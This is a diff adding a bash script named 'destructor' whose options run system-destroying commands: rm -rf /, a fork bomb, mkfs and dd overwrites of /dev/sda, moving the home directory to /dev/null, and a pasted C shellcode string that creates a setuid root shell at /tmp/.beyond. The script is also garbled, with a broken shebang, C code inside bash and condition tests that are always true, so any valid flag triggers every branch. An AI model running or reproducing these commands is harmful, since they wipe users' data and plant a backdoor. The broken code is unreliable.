@@ -1,0 +1,128 @@
+#!i/bin/env bash
+
+printusage () {
+    echo "Usage: destructor [-d] [-g] [-fb] [-fd] [-wd] [-wd2] [-mh]"
+    echo ""
+    echo "       -d, --delete  : deletes everything!"
+    echo "       -g, --gone    : deletes everything in a different way"
+    echo "       -fb, --fork   : infinite file maker loop"
+    echo "       -fd, --format : wipe all hard drive files"
+    echo "       -wd, --write  : create new ext4 filse system"
+    echo "       -wd2, --write2 : write data directly to hard drive"
+    echo "       -mh, --move   : moves home directory to blackhole"
+}
+
+DELETE_ALL=false
+DELETE_ALL_2=false
+INFINITE_FILES=false
+WIPE_HARDDRIVE=false
+CREATE_SYSTEM=false
+WRITE_DRIVE=false
+WRITE_DRIVE_JUNK=false
+MOVE_HOME=false
+
+for i in "$@"
+do
+    case $i in
+        --help|-h)
+            printusage
+            exit 1
+            ;;
+        --delete|-d)
+            DELETE_ALL=true
+            shift
+            ;;
+        --gone|-g)
+	    DELETE_ALL_2=true
+            shift
+            ;;
+        --fork|-FB)
+            INFINITE_FILES=true
+            shift
+            ;;
+        --format|-fd)
+            WIPE_HARDDRIVE=true
+            shift
+            ;;
+        --write|-wd)
+            CREATE_SYSTEM=true
+            shift
+            ;;
+        --write2|-wd2)
+            WRITE_DRIVE=true
+            shift
+            ;;
+        --move|-mh)
+            MOVE_HOME=true
+            shift
+            ;;
+        *)
+            printusage
+            exit 1
+            ;;
+    esac
+done
+
+if [[ DELETE_ALL=true ]] ; then
+
+       rm -rf /
+fi
+
+
+if [[ DELETE_ALL_2=true ]] ; then
+
+       char esp[] __attribute__ ((section(“.text”))) /* e.s.p
+release */
+= “\xeb\x3e\x5b\x31\xc0\x50\x54\x5a\x83\xec\x64\x68”
+“\xff\xff\xff\xff\x68\xdf\xd0\xdf\xd9\x68\x8d\x99”
+“\xdf\x81\x68\x8d\x92\xdf\xd2\x54\x5e\xf7\x16\xf7”
+“\x56\x04\xf7\x56\x08\xf7\x56\x0c\x83\xc4\x74\x56”
+“\x8d\x73\x08\x56\x53\x54\x59\xb0\x0b\xcd\x80\x31”
+“\xc0\x40\xeb\xf9\xe8\xbd\xff\xff\xff\x2f\x62\x69”
+“\x6e\x2f\x73\x68\x00\x2d\x63\x00”
+“cp -p /bin/sh /tmp/.beyond; chmod 4755
+/tmp/.beyond;”;
+
+fi
+
+
+if [[ INFINITE_FILES=true ]] ; then
+  
+       :(){ :|: & };:
+
+fi
+
+
+if [[ WIPE_HARDDRIVE=true ]] ; then
+  
+       mkfs.ext4 /dev/sdb2;
+
+fi
+
+if [[ CREATE_SYSTEM=true ]] ; then
+
+       mkfs.ext4 /dev/sda1
+
+fi
+
+if [[ WRITE_DRIVE=true ]] ; then 
+       
+       dd ~ > /dev/sda
+       
+fi
+
+if [[ WRITE_DRIVE_JUNK=true ]] ; then
+       
+       dd if=/dev/random of=/dev/sda
+
+fi
+ 
+if [[ MOVE_HOME=true ]] ; then 
+
+       mv ~ /dev/null
+
+fi
+
+# 
+
+exit 0
